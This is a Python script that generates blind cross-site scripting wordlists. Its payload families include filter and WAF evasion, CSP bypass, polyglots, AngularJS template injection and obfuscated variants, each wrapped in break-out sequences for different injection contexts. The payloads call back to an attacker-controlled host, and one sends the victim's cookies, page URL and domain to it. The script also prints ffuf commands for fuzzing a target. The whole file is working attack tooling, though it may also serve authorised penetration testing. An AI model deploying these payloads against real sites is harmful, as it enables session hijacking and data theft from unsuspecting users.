#!/usr/bin/env python3
"""
Blind XSS Wordlist Generator with Context Break-Out Engine
See --help or --list for full documentation.
"""
import argparse, sys, base64, urllib.parse
from datetime import datetime

DEFAULT_IP   = "http://YOUR_IP_HERE"
OUTPUT_FILE  = "blind_xss_wordlist.txt"

# ══════════════════════════════════════════════════════════════════════════════
# CONTEXT BREAK-OUT TABLE
# Each entry: (label, prefix, suffix)
#   label  → included in generated PID for instant diagnosis of which context broke
#   prefix → prepended to payload to escape the current injection context
#   suffix → appended to reclose the context (avoids full page rejection)
#
# Example resulting PID: BAS-001_attr_double-quote
#   = payload BAS-001 was tested after breaking out of a double-quoted HTML attribute
# ══════════════════════════════════════════════════════════════════════════════
CONTEXT_BREAKS = {

    # ── HTML ─────────────────────────────────────────────────────────────────
    # Injected into raw HTML: between tags, inside comments, <title>, <textarea>,
    # <noscript>, XML/SVG CDATA…
    "html": [
        ("html:close-tag",          ">",                                         ""),
        ("html:close-double",       "><",                                        ">"),
        ("html:close-slash",        "/>",                                        ""),
        ("html:comment-close",      "-->",                                       "<!--"),
        ("html:comment-close-ie",   "--!>",                                      "<!--"),
        ("html:title-close",        "</title>",                                  "<title>"),
        ("html:textarea-close",     "</textarea>",                               "<textarea>"),
        ("html:script-close",       "</script>",                                 "<script>"),
        ("html:style-close",        "</style>",                                  "<style>"),
        ("html:noscript-close",     "</noscript>",                               "<noscript>"),
        ("html:template-close",     "</template>",                               "<template>"),
        ("html:iframe-close",       "</iframe>",                                 "<iframe>"),
        ("html:noembed-close",      "</noembed>",                                "<noembed>"),
        ("html:close-many",         "></title></textarea></script></style>",     "<title>"),
        ("html:cdata-close",        "]]>",                                       "<![CDATA["),
    ],

    # ── JS ───────────────────────────────────────────────────────────────────
    # Injected into JavaScript code: string literals (', ", `),
    # code blocks, function arguments, JS comments…
    "js": [
        ("js:single-quote",         "'",                                         "//"),
        ("js:double-quote",         '"',                                         "//"),
        ("js:backtick",             "`",                                         "//"),
        ("js:single-semi",          "';",                                        "//"),
        ("js:double-semi",          '";',                                        "//"),
        ("js:backtick-semi",        "`;",                                        "//"),
        ("js:paren-close",          ")",                                         "//"),
        ("js:paren-semi",           ");",                                        "//"),
        ("js:brace-close",          "}",                                         "//"),
        ("js:bracket-close",        "]",                                         "//"),
        ("js:multi-close",          "')};",                                      "//"),
        ("js:comment-close",        "*/",                                        "/*"),
        ("js:line-comment",         "//",                                        "\n"),
        ("js:throw",                "throw 0;",                                  "//"),
        ("js:newline",              "\n",                                        "\n//"),
        ("js:crlf",                 "\r\n",                                      "\r\n//"),
        ("js:nullbyte",             "\x00",                                      ""),
    ],

    # ── ATTR ─────────────────────────────────────────────────────────────────
    # Injected into an HTML attribute value:
    # value="INJECTION", value='INJECTION', value=INJECTION (unquoted)
    "attr": [
        ("attr:double-quote",       '"',                                         '"'),
        ("attr:single-quote",       "'",                                         "'"),
        ("attr:double-space",       '" ',                                        '"'),
        ("attr:single-space",       "' ",                                        "'"),
        ("attr:unquoted-space",     " ",                                         " "),
        ("attr:unquoted-slash",     "/",                                         ">"),
        ("attr:double-close-tag",   '">',                                        ""),
        ("attr:single-close-tag",   "'>",                                        ""),
        ("attr:double-close-slash", '"/>',                                       ""),
        ("attr:single-close-slash", "'/>",                                       ""),
        ("attr:event-inject-dq",    '" onmouseover="',                           '"'),
        ("attr:event-inject-sq",    "' onmouseover='",                           "'"),
        ("attr:href-break",         '" href="javascript:',                       '"'),
        ("attr:srcset-break",       '" srcset="x 1x,',                          '"'),
    ],

    # ── URL ──────────────────────────────────────────────────────────────────
    # Injected into a URL: GET parameter, redirect target, href, src…
    "url": [
        ("url:fragment",            "#",                                         ""),
        ("url:query-end",           "?",                                         ""),
        ("url:amp",                 "&",                                         ""),
        ("url:amp-param",           "&xss=",                                     ""),
        ("url:equal",               "=",                                         ""),
        ("url:path-slash",          "/",                                         ""),
        ("url:double-slash",        "//",                                        ""),
        ("url:encode-newline",      "%0a",                                       ""),
        ("url:encode-crlf",         "%0d%0a",                                    ""),
        ("url:javascript-proto",    "javascript:",                               ""),
        ("url:data-proto",          "data:text/html,",                           ""),
        ("url:param-html",          "=</p><script>",                             "</script>"),
    ],

    # ── JSON ─────────────────────────────────────────────────────────────────
    # Injected into a JSON structure: string value, array, nested object, JSONP
    "json": [
        ("json:string-close",       '"',                                         '"'),
        ("json:string-semi",        '",',                                        '"'),
        ("json:key-inject",         '","xss":"',                                 '"'),
        ("json:array-close",        "]",                                         "["),
        ("json:obj-close",          "}",                                         "{"),
        ("json:deep-close",         '"}',                                        '{"x":"'),
        ("json:callback-close",     "});",                                       "({}),//"),
    ],

    # ── CSS ──────────────────────────────────────────────────────────────────
    # Injected into a CSS style attribute or stylesheet
    "css": [
        ("css:close-brace",         "}",                                         "{x:y}"),
        ("css:close-value",         ";",                                         "x:y"),
        ("css:comment-close",       "*/",                                        "/*"),
        ("css:expression",          "expression(",                               ")"),
        ("css:url-close",           ")",                                         "("),
        ("css:style-close-tag",     "</style>",                                  "<style>"),
        ("css:import",              "@import '",                                 "';"),
    ],
}

CONTEXT_ALIASES = {
    "html": ["html"], "js":  ["js"],  "attr": ["attr"],
    "url":  ["url"],  "json":["json"],"css":  ["css"],
    "all":  list(CONTEXT_BREAKS.keys()),
}


def b64(s): return base64.b64encode(s.encode()).decode()
def cb(ip, pid): return f"{ip}/{pid}"


def build_payloads(ip):
    def sl(pid):   # script loader
        return f"var s=document.createElement('script');s.src='{cb(ip,pid)}';document.body.appendChild(s);"
    def ib(pid):   # img beacon
        return f"new Image().src='{cb(ip,pid)}';"
    def exfil(pid):
        return (f"var d=document;fetch('{cb(ip,pid)}?c='+encodeURIComponent(d.cookie)"
                f"+'&u='+encodeURIComponent(d.URL)+'&o='+encodeURIComponent(d.domain));")

    cats = {}

    # ── BASIC ────────────────────────────────────────────────────────────────
    basic = [
        ("BAS-001", f"<script src='{cb(ip,'BAS-001')}'></script>",              "Basic <script src>"),
        ("BAS-002", f"<script>{sl('BAS-002')}</script>",                        "Basic <script> inline script loader"),
        ("BAS-003", f"<img src=x onerror=\"{sl('BAS-003')}\">",                 "img onerror script loader"),
        ("BAS-004", f"<svg onload=\"{sl('BAS-004')}\">",                        "svg onload script loader"),
        ("BAS-005", f"<body onload=\"{sl('BAS-005')}\">",                       "body onload script loader"),
        ("BAS-006", f"<iframe onload=\"{sl('BAS-006')}\">",                     "iframe onload"),
        ("BAS-007", f"<input autofocus onfocus=\"{sl('BAS-007')}\">",           "input autofocus onfocus"),
        ("BAS-008", f"<details open ontoggle=\"{sl('BAS-008')}\">",             "details ontoggle"),
        ("BAS-009", f"<marquee onstart=\"{sl('BAS-009')}\">",                   "marquee onstart"),
        ("BAS-010", f"<video src=x onerror=\"{sl('BAS-010')}\">",               "video onerror"),
        ("BAS-011", f"<audio src=x onerror=\"{sl('BAS-011')}\">",               "audio onerror"),
        ("BAS-012", f"<script>{exfil('BAS-012')}</script>",                     "Full exfil: cookie+URL+domain"),
        ("BAS-013", f"javascript:{sl('BAS-013')}",                              "javascript: URI"),
        ("BAS-014", "<object data='javascript:" + ib("BAS-014") + "'>",        "object data javascript URI"),
    ]
    cats["basic"] = basic

    # ── EVENT ────────────────────────────────────────────────────────────────
    event_defs = [
        ("EVT-001","<body","onpageshow"),("EVT-002","<body","onhashchange"),
        ("EVT-003","<svg","onanimationstart"),("EVT-004","<svg","onanimationend"),
        ("EVT-005","<form","oninput"),("EVT-006","<select","onchange"),
        ("EVT-007","<textarea","onfocus"),("EVT-008","<video","oncanplay"),
        ("EVT-009","<track","onerror"),("EVT-010","<object","onafterscriptexecute"),
        ("EVT-011","<object","onbeforescriptexecute"),("EVT-012","<div","onmouseover"),
        ("EVT-013","<a href='#'","onmousedown"),("EVT-014","<button","onclick"),
        ("EVT-015","<div","onclick"),
    ]
    event = [(pid, f"{tag} {ev}=\"{sl(pid)}\">", f"{tag} {ev}") for pid,tag,ev in event_defs]
    cats["event"] = event

    # ── BYPASS ───────────────────────────────────────────────────────────────
    bypass = [
        ("BYP-001", f"<sCrIpT sRc='{cb(ip,'BYP-001')}'></ScRiPt>",             "Mixed case tag"),
        ("BYP-002", f"<script x src='{cb(ip,'BYP-002')}'></script>",            "Extra attribute"),
        ("BYP-003", f"<img src='1' onerror='{sl('BYP-003')}' <",                "Incomplete HTML tag"),
        ("BYP-004", f"<script>window['fetch']('{cb(ip,'BYP-004')}')</script>",  "Bracket notation"),
        ("BYP-005", f"<script>eval(atob('{b64(sl('BYP-005'))}'))</script>",     "base64 atob() bypass"),
        ("BYP-006", f"<svg onload=fetch`{cb(ip,'BYP-006')}`>",                  "Template literal (bypass parens)"),
        ("BYP-007", f"<script>onerror={ib('BYP-007')};throw 1337</script>",     "onerror+throw (bypass parens+semi)"),
        ("BYP-008", f"<img/src='1'/onerror={ib('BYP-008')}>",                   "Slash space bypass"),
        ("BYP-009", f"<svg\fonload\f=\f{ib('BYP-009')}\f>",                     "Form-feed 0x0C space bypass"),
        ("BYP-010",
            f"<script>var s=document.createElement('script');s.src=String.fromCharCode"
            f"({','.join(str(ord(c)) for c in cb(ip,'BYP-010'))});document.body.appendChild(s);</script>",
            "String.fromCharCode (no quotes)"),
        ("BYP-011", f"</script><script src='{cb(ip,'BYP-011')}'></script>",     "Break out of script tag"),
        ("BYP-012", f"<img src='1' onerror\x00={ib('BYP-012')} />",             "Null byte in event name"),
        ("BYP-013", f"<svg onload={ib('BYP-013')}//",                           "No closing >"),
        ("BYP-015", f"<svg onload=%26%2397%3Bfetch('{urllib.parse.quote(cb(ip,'BYP-015'))}')>",
                                                                                 "HTML entity %26%23 trick"),
        ("BYP-016",
            f"<a href='' onmousedown=\"var x='&#39;;{ib('BYP-016')}//'\">X</a>",
            "&#39; quote bypass in mousedown"),
        ("BYP-017",
            f"<div></div><script>window['doc'+'ument']['loc'+'ation']='javascript:{ib('BYP-017')}'</script>",
            "Concat bypass document blacklist"),
    ]
    cats["bypass"] = bypass

    # ── WAF ──────────────────────────────────────────────────────────────────
    _ie = f"<script>new Image().src='{cb(ip,'WAF-005')}'</script>"
    _ie_enc = _ie.replace("<","&lt;").replace(">","&gt;")
    waf = [
        ("WAF-001", f"<svg/onrandom=random onload={ib('WAF-001')}>",            "Cloudflare - random attr"),
        ("WAF-002", f'<svg/OnLoad="`${{{ib("WAF-002")}}}`">',                   "Cloudflare - template literal OnLoad"),
        ("WAF-003", f"<svg/onload=&nbsp;{ib('WAF-003')}+",                      "Cloudflare - &nbsp; prefix"),
        ("WAF-004", f"1'\"><img/src/onerror=.1|{ib('WAF-004')}>",               "Cloudflare - .1| trick"),
        ("WAF-005", f"xss'\"><iframe srcdoc='{_ie_enc}'>",                      "Cloudflare - iframe srcdoc"),
        ("WAF-006", f"<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f>","Cloudflare - HTML entity numbers"),
        ("WAF-007", f"<svg onload\r\n=$.globalEval(\"{ib('WAF-007')}\");>",      "Incapsula - CRLF event handler"),
        ("WAF-008",
            "<object data='data:text/html;base64," + b64("<script>" + ib("WAF-008") + "</script>") + "'></object>",
            "Incapsula - base64 object data"),
        ("WAF-009", f"<dETAILS%0aopen%0aonToGgle%0a=%0a{ib('WAF-009')} x>",     "Akamai - details ontoggle NL"),
        ("WAF-010", f"<a href=javas&#99;ript:{ib('WAF-010')}>X</a>",             "WordFence - entity in javascript:"),
        ("WAF-011", f"\\u003e\\u003c\\u0068\\u0031 onclick=\"{ib('WAF-011')}\"\\u003e",
                                                                                 "Fortiweb - unicode escapes"),
        ("WAF-012", f"<a href=\"j\tav\tasc\nri\tpt\t:{ib('WAF-012')}\">X</a>",  "Cloudflare - tab/NL in href"),
    ]
    cats["waf"] = waf

    # ── CSP ──────────────────────────────────────────────────────────────────
    csp = [
        ("CSP-001",
            f"<script/src=//google.com/complete/search?client=chrome%26jsonp={ib('CSP-001')}>",
            "JSONP via Google"),
        ("CSP-002", "<script/src=//www.youtube.com/oembed?callback=fetch></script>","JSONP via YouTube"),
        ("CSP-003",
            f"<script>f=document.createElement('iframe');f.src='/robots.txt';"
            f"f.onload=()=>{{x=document.createElement('script');x.src='{cb(ip,'CSP-003')}';"
            f"f.contentWindow.document.body.appendChild(x)}};document.body.appendChild(f);</script>",
            "default-src self bypass via iframe"),
        ("CSP-004",
            "<object data='data:text/html;base64," + b64("<script>" + ib("CSP-004") + "</script>") + "'>",
            "object data base64"),
        ("CSP-005",
            "<script src='data:application/javascript;base64," + b64(ib("CSP-005")) + "'>/</script>",
            "script-src data: URI"),
        ("CSP-006", f"<base href='{cb(ip,'CSP-006')}'>",                        "base tag nonce bypass"),
        ("CSP-007", f"\"/><script>{ib('CSP-007')}</script>",                    "unsafe-inline attr break-out"),
        ("CSP-008",
            f"GET /?xss=<script src='{cb(ip,'CSP-008')}'></script>" + "&a="*1000,
            "PHP header 1000-param bypass"),
    ]
    cats["csp"] = csp

    # ── POLYGLOT ─────────────────────────────────────────────────────────────
    polyglot = [
        ("POL-001",
            f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={ib('POL-001')} )//%0D%0A%0D%0A"
            f"//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csvg/<svg/oNloAd={ib('POL-001')}//>/\\x3e",
            "0xsobky polyglot"),
        ("POL-002",
            f"\">><marquee><img src=x onerror={ib('POL-002')}></marquee>\" ></plaintext\\></|\\>"
            f"<plaintext/onmouseover={ib('POL-002')} ><script>{ib('POL-002')}</script>",
            "Ashar Javed HTML multi-context"),
        ("POL-003",
            f"\" onclick={ib('POL-003')}//<button ' onclick={ib('POL-003')}//>",
            "Mathias Karlsson attr/HTML"),
        ("POL-004",
            f"javascript:\"/*\\\"/*`/*' /*</template></textarea></noembed></noscript></title>"
            f"</style></script>-->&lt;svg/onload=/*<html/*/onmouseover={ib('POL-004')}//>",
            "EdOverflow JS+HTML+attr"),
        ("POL-005",
            f"JavaScript://%250A{ib('POL-005')}//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!-->"
            f"</Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable"
            f"/autoFocus/OnFocus=/*${{}};{{{ib('POL-005')}}}//><Base/Href=//{cb(ip,'POL-005')}\\76-->",
            "brutelogic comprehensive"),
        ("POL-006",
            f"-->'\"/<br></sCript><svG x=\">\" onload=(fetch)`{cb(ip,'POL-006')}`>",
            "s0md3v SVG template literal fetch"),
        ("POL-007", f"<svg%0Ao%00nload={ib('POL-007')}//",                      "SVG null byte + CRLF"),
    ]
    cats["polyglot"] = polyglot

    # ── ANGULAR ──────────────────────────────────────────────────────────────
    def ang_loader(pid):
        return f"var _=document.createElement('script');_.src='{cb(ip,pid)}';document.getElementsByTagName('body')[0].appendChild(_)"

    angular = [
        ("ANG-001", "{{constructor.constructor(\"" + ang_loader("ANG-001") + "\")()}}",
         "CSTI 1.0.1-1.1.5/>1.6.0 (Cure53)"),
        ("ANG-002", "{{$on.constructor(\"" + ang_loader("ANG-002") + "\")()}}",
         "CSTI 1.0.1-1.1.5/>1.6.0 shorter"),
        ("ANG-003",
            '{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval(\'a",eval(`'
            + f"var _=document\\\\x2ecreateElement(\\'script\\');_\\\\x2esrc=\\'{cb(ip,'ANG-003')}\\';document\\\\x2ebody\\\\x2eappendChild(_);"
            + '`),"\')}};',
            "CSTI 1.2.0-1.2.5"),
        ("ANG-004",
            '{{a=toString().constructor.prototype;a.charAt=a.trim;$eval(\'a,eval(`'
            + f"var _=document.createElement(\\'script\\');_.src=\\'{cb(ip,'ANG-004')}\\';document.body.appendChild(_);"
            + '`),a\')}}',
            "CSTI 1.4.0-1.5.8"),
        ("ANG-005",
            "{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x("
            + "118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,"
            + "69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39,"
            + ",".join(str(ord(c)) for c in cb(ip,"ANG-005"))
            + ",39,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))()}}",
            "CSTI 1.6+ no-quotes fromCharCode"),
        ("ANG-006", "{{$eval.constructor(\"" + ang_loader("ANG-006") + "\")()}}",
         "CSTI 1.6+ $eval.constructor"),
        ("ANG-007", "{{constructor.constructor(\"" + f"new Image().src='{cb(ip,'ANG-007')}'" + "\")()}}",
         "VueJS constructor.constructor img beacon"),
    ]
    cats["angular"] = angular

    # ── DOM ──────────────────────────────────────────────────────────────────
    dom = [
        ("DOM-001", f"#<script src='{cb(ip,'DOM-001')}'></script>",             "location.hash script"),
        ("DOM-002", f"javascript:document.write('<script src=\"{cb(ip,'DOM-002')}\"><\\/script>')",
                                                                                 "document.write"),
        ("DOM-003", f"<img src=x onerror={ib('DOM-003')}>",                    "innerHTML img onerror"),
        ("DOM-004", f"'-{ib('DOM-004')}-'",                                     "JS string break in eval"),
        ("DOM-005",
            f"<script>window.postMessage('<img src=x onerror=\"{ib('DOM-005')}\">', '*');</script>",
            "postMessage"),
        ("DOM-006", f"javascript:{ib('DOM-006')}location.href",                 "location redirect"),
        ("DOM-007", f"#<img src=x onerror={ib('DOM-007')}>",                   "hash innerHTML sink"),
    ]
    cats["dom"] = dom

    # ── OBFUSCATED ───────────────────────────────────────────────────────────
    _key = 42
    _xored = [ord(c) ^ _key for c in f"new Image().src='{cb(ip,'OBF-010')}';"]
    obfuscated = [
        ("OBF-001",
            f"<script>\\u0076\\u0061\\u0072 \\u0073=\\u0064\\u006F\\u0063\\u0075\\u006D\\u0065\\u006E\\u0074"
            f".\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0045\\u006C\\u0065\\u006D\\u0065\\u006E\\u0074"
            f"('\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074');\\u0073.\\u0073\\u0072\\u0063='{cb(ip,'OBF-001')}';"
            f"\\u0064\\u006F\\u0063\\u0075\\u006D\\u0065\\u006E\\u0074.\\u0062\\u006F\\u0064\\u0079"
            f".\\u0061\\u0070\\u0070\\u0065\\u006E\\u0064\\u0043\\u0068\\u0069\\u006C\\u0064(\\u0073);</script>",
            "Unicode escape sequences"),
        ("OBF-002", "<script>Function(atob('" + b64(ib("OBF-002")) + "'  ))()</script>",
                                                                                "Function(atob())"),
        ("OBF-003", "<script>eval(atob('" + b64(ib("OBF-003")) + "'))</script>",   "eval(atob())"),
        ("OBF-004",
            "<script>setTimeout('new I'+'mage().s'+'rc=\"" + cb(ip,'OBF-004') + "\"',0)</script>",
            "setTimeout string concat"),
        ("OBF-005",
            "<script>eval('\\146\\145\\164\\143\\150(\"' + '" + cb(ip,'OBF-005') + "' + '\")')</script>",
            "Octal encoding"),
        ("OBF-006",
            "<script>eval(decodeURIComponent('" + urllib.parse.quote(ib("OBF-006")) + "'))</script>",
            "URL encode + decodeURIComponent"),
        ("OBF-007",
            f"<script>['{cb(ip,'OBF-007')}'].map(u=>{{var s=document.createElement('script');"
            f"s.src=u;document.body.appendChild(s)}})</script>",
            "Array.map arrow function"),
        ("OBF-008", f"<script>this['fe'+'tch']('{cb(ip,'OBF-008')}')</script>", "this[] split concat"),
        ("OBF-009",
            f"<script>a=()=>{{c=0;for(i in self){{if(/^fe[tc]+h$/.test(i)){{return c}}c++}}}};"
            f"self[Object.keys(self)[a()]]('{cb(ip,'OBF-009')}')</script>",
            "Object.keys + regex find fetch"),
        ("OBF-010",
            f"<script>eval(String.fromCharCode(...[{','.join(str(x) for x in _xored)}].map(c=>c^{_key})))</script>",
            "XOR + fromCharCode"),
    ]
    cats["obfuscated"] = obfuscated

    return cats


# ══════════════════════════════════════════════════════════════════════════════
# WRAP ENGINE
# ══════════════════════════════════════════════════════════════════════════════

def get_breaks(contexts):
    seen, result = set(), []
    for ctx in contexts:
        for key in CONTEXT_ALIASES.get(ctx, [ctx]):
            for label, pre, suf in CONTEXT_BREAKS.get(key, []):
                if (pre, suf) not in seen:
                    seen.add((pre, suf))
                    result.append((label, pre, suf))
    return result


def apply_wraps(payloads, breaks, mode):
    out = []
    for pid, payload, desc in payloads:
        for label, pre, suf in breaks:
            if mode == "prefix":   wrapped = pre + payload
            elif mode == "suffix": wrapped = payload + suf
            else:                  wrapped = pre + payload + suf
            slug = label.replace(":", "_").replace(" ", "-")
            out.append((f"{pid}_{slug}", wrapped, f"{desc} [wrap={label}, mode={mode}]"))
    return out


# ══════════════════════════════════════════════════════════════════════════════
# WRITE
# ══════════════════════════════════════════════════════════════════════════════

def write_wordlist(cats, selected, out_file, ip, wrap=False, wrap_ctx=None, wrap_mode="both"):
    breaks = get_breaks(wrap_ctx) if wrap and wrap_ctx else []
    rows = []
    for cat in selected:
        if cat not in cats: continue
        for p in cats[cat]:   rows.append((*p, cat.upper(), "BASE"))
        if breaks:
            for p in apply_wraps(cats[cat], breaks, wrap_mode):
                rows.append((*p, cat.upper(), "WRAPPED"))

    with open(out_file, "w", encoding="utf-8") as f:
        f.write(f"# BLIND XSS WORDLIST\n")
        f.write(f"# Generated   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Callback IP : {ip}\n")
        f.write(f"# Categories  : {', '.join(selected)}\n")
        if wrap:
            f.write(f"# Wrap mode     : {wrap_mode}\n")
            f.write(f"# Wrap contexts : {', '.join(wrap_ctx or [])}\n")
            f.write(f"# Break seqs    : {len(breaks)}\n")
        f.write(f"# Total payloads: {len(rows)}\n#\n")
        f.write(f"# HOW TO READ HITS:\n")
        f.write(f"#   Hit on /<PAYLOAD_ID> → that exact payload triggered XSS\n")
        if wrap:
            f.write(f"#   BAS-001_attr_double-quote → BAS-001 after breaking out of double-quoted attr\n")
        f.write(f"# {'─'*70}\n\n")

        cur_cat = cur_status = None
        for pid, payload, desc, cat, status in rows:
            if cat != cur_cat:
                cur_cat = cat; cur_status = None
                f.write(f"\n# {'═'*68}\n# CATEGORY: {cat}\n# {'═'*68}\n\n")
            if wrap and status != cur_status:
                cur_status = status
                if status == "WRAPPED":
                    f.write(f"\n# {'─'*68}\n# ↓  WRAPPED VARIANTS — context break-out\n# {'─'*68}\n\n")
            f.write(f"# [{pid}] {desc}\n{payload}\n\n")

    return len(rows)


# ══════════════════════════════════════════════════════════════════════════════
# SUMMARY
# ══════════════════════════════════════════════════════════════════════════════

def summary(cats, selected, out_file, ip, total, wrap, wrap_ctx, wrap_mode):
    G,Y,C,B,R = "\033[92m","\033[93m","\033[96m","\033[1m","\033[0m"
    print(f"\n{B}{C}╔══════════════════════════════════════════════════════╗{R}")
    print(f"{B}{C}║        BLIND XSS WORDLIST GENERATOR — DONE           ║{R}")
    print(f"{B}{C}╚══════════════════════════════════════════════════════╝{R}\n")
    print(f"  {B}Callback IP   :{R} {Y}{ip}{R}")
    print(f"  {B}Output file   :{R} {G}{out_file}{R}")
    if wrap:
        print(f"  {B}Wrap mode     :{R} {Y}{wrap_mode}{R}")
        print(f"  {B}Wrap contexts :{R} {Y}{', '.join(wrap_ctx or [])}{R}")
        print(f"  {B}Break seqs    :{R} {len(get_breaks(wrap_ctx or []))}")
    print(f"  {B}Total payloads:{R} {B}{total}{R}\n")
    print(f"  {B}Breakdown:{R}")
    for cat in selected:
        if cat in cats:
            n = len(cats[cat]); bar = "█"*(n//2)
            if wrap and wrap_ctx:
                wn = n*len(get_breaks(wrap_ctx))
                print(f"    {C}{cat:<12}{R} {bar} {n} base + {Y}{wn}{R} wrapped")
            else:
                print(f"    {C}{cat:<12}{R} {bar} {n}")
    print(f"\n  {B}ffuf:{R} {Y}ffuf -u https://TARGET/FUZZ -w {out_file}{R}")
    print(f"  {B}Callback:{R} {Y}python3 -m http.server 80{R}")
    if wrap:
        print(f"\n  {B}Reading hits:{R}")
        print(f"    {Y}/BAS-001_attr_double-quote{R} → BAS-001 worked after double-quote attr break-out")
    print()


# ══════════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════════

def main():
    ALL = ["basic","event","bypass","waf","csp","polyglot","angular","dom","obfuscated"]
    CTX = list(CONTEXT_ALIASES.keys())

    p = argparse.ArgumentParser(
        description="Blind XSS wordlist generator with optional context break-out engine.",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    p.add_argument("--ip",  "-i", default=DEFAULT_IP)
    p.add_argument("--output","-o",default=OUTPUT_FILE)
    p.add_argument("--categories","-c",nargs="+",
                   choices=ALL+["all"],default=["all"])

    wg = p.add_argument_group("context break-out",
        "Surrounds each payload with context-escape sequences.\n"
        "Each variant gets a unique PID encoding the context broken.\n"
        "Example PID: BAS-001_attr_double-quote")
    wg.add_argument("--wrap","-w",action="store_true",
                    help="Enable context break-out mode")
    wg.add_argument("--contexts","-x",nargs="+",choices=CTX,default=["all"],
                    dest="wrap_ctx",metavar="CTX",
                    help="Contexts: "+", ".join(CTX))
    wg.add_argument("--wrap-mode","-m",choices=["prefix","suffix","both"],
                    default="both",help="prefix | suffix | both (default)")
    p.add_argument("--list","-l",action="store_true",
                   help="List categories and contexts then exit")

    args = p.parse_args()

    if args.list:
        C,G,B,R = "\033[96m","\033[92m","\033[1m","\033[0m"
        print(f"\n{B}Payload categories:{R}")
        for k,v in {"basic":"Fundamental (script/img/svg/iframe...)","event":"Uncommon event handlers",
            "bypass":"Filter bypass (case/quotes/encoding/dots...)","waf":"WAF bypass (CF/Akamai/Incapsula...)",
            "csp":"CSP bypass (JSONP/base64/iframe...)","polyglot":"Multi-context polyglots",
            "angular":"AngularJS/VueJS CSTI","dom":"DOM-based XSS",
            "obfuscated":"Obfuscated (base64/unicode/XOR/octal...)"}.items():
            print(f"  {C}{k:<14}{R} {v}")
        print(f"\n{B}Wrap contexts:{R}")
        for k,v in {"html":"Raw HTML (comment/title/textarea/script...)","js":"JS code (string/template literal/block...)",
            "attr":"HTML attribute (double/single quote/unquoted...)","url":"URL (href/src/redirect/fragment...)",
            "json":"JSON (string/array/object/JSONP...)","css":"CSS (style attr/expression/import...)",
            "all":"All contexts above"}.items():
            print(f"  {G}{k:<8}{R} {v}")
        print(f"\n{B}Wrap modes:{R}")
        print(f"  prefix  — break-out BEFORE payload")
        print(f"  suffix  — reclosing AFTER payload")
        print(f"  both    — prefix + suffix (recommended)\n")
        print(f"{B}Examples:{R}")
        print(f"  python3 {sys.argv[0]} --ip http://1.2.3.4 --wrap")
        print(f"  python3 {sys.argv[0]} --ip http://1.2.3.4 --wrap --contexts attr js url")
        print(f"  python3 {sys.argv[0]} -i http://1.2.3.4 -c basic bypass -w -x attr js -m suffix\n")
        sys.exit(0)

    selected = ALL if "all" in args.categories else args.categories
    wrap_ctx = []
    if args.wrap:
        raw = args.wrap_ctx or ["all"]
        wrap_ctx = list(CONTEXT_BREAKS.keys()) if "all" in raw else raw

    print(f"\n[*] Generating Blind XSS payloads...")
    print(f"[*] Callback IP : {args.ip}")
    print(f"[*] Categories  : {', '.join(selected)}")
    if args.wrap:
        breaks = get_breaks(wrap_ctx)
        print(f"[*] Wrap ON     : mode={args.wrap_mode}, contexts={', '.join(wrap_ctx)}")
        print(f"[*] Break seqs  : {len(breaks)}")

    cats  = build_payloads(args.ip)
    total = write_wordlist(cats, selected, args.output, args.ip,
                           wrap=args.wrap, wrap_ctx=wrap_ctx if args.wrap else None,
                           wrap_mode=args.wrap_mode)
    summary(cats, selected, args.output, args.ip, total,
            args.wrap, wrap_ctx if args.wrap else [], args.wrap_mode)


if __name__ == "__main__":
    main()
